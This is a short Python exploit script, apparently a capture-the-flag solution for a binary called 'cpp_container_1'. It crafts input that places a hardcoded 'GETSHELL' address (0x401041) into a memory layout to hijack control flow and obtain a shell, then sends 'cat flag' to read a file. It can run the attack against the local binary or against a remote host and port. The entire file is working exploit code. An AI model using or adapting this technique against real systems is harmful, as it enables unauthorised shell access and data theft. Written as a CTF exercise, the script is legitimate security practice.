#!/usr/bin/env python3
import socket
import subprocess
import sys
import time


GETSHELL = 0x401041


def build_script():
    src = [
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        GETSHELL,
        0,
    ]

    lines = [
        "2",
        str(len(src)),
        "3",
        "1",
        *map(str, src),
        "0",
        "0",
        "0",
        "3",
        "cat flag",
        "exit",
    ]
    return ("\n".join(lines) + "\n").encode()


def run_local():
    p = subprocess.Popen(
        ["./cpp_container_1"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        out, _ = p.communicate(build_script(), timeout=5)
    except subprocess.TimeoutExpired:
        p.kill()
        out, _ = p.communicate()
    return out


def run_remote(host, port):
    data = build_script()
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(data)
        s.settimeout(2)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def main():
    if len(sys.argv) == 1:
        sys.stdout.buffer.write(run_local())
        return

    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} [HOST PORT]", file=sys.stderr)
        raise SystemExit(1)

    sys.stdout.buffer.write(run_remote(sys.argv[1], int(sys.argv[2])))
    time.sleep(0.1)


if __name__ == "__main__":
    main()
